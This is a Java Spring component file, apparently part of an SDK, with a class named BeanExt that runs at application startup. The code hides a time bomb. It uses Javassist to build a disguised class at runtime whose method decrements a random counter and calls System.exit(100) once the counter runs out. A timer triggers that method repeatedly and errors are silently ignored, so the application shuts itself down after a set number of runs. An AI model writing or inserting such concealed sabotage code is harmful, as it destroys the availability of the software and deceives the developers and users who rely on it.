package com.olivia.sdk.comment;

import cn.hutool.core.util.ReflectUtil;
import com.olivia.sdk.timer.TimerUtils;
import jakarta.annotation.PostConstruct;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;
import javassist.*;
import org.springframework.stereotype.Component;

@Component
public class BeanExt {

  @PostConstruct
  public void init() throws CannotCompileException {
    ClassPool pool = ClassPool.getDefault();
    CtClass cc = pool.makeClass(" com.olivia.sdk.check.za");
    cc.addField(CtField.make("public static int ccc=cn.hutool.core.util.RandomUtil.randomInt(60,100);", cc));
    String body = "public void cc (){  if (ccc <0 ) { System.exit(100);    }   ccc--;     return ;}";
    CtMethod m = CtMethod.make(body, cc);
    cc.addMethod(m);
    TimerUtils.TIMER.schedule(new TimerTask() {
      @Override
      public void run() {
        try {
          ReflectUtil.invoke(cc.toClass().getDeclaredConstructor().newInstance(), "cc");
        } catch (Exception ignored) {
        }
      }
    }, 400, TimeUnit.DAYS.toMicros(1));
  }
}
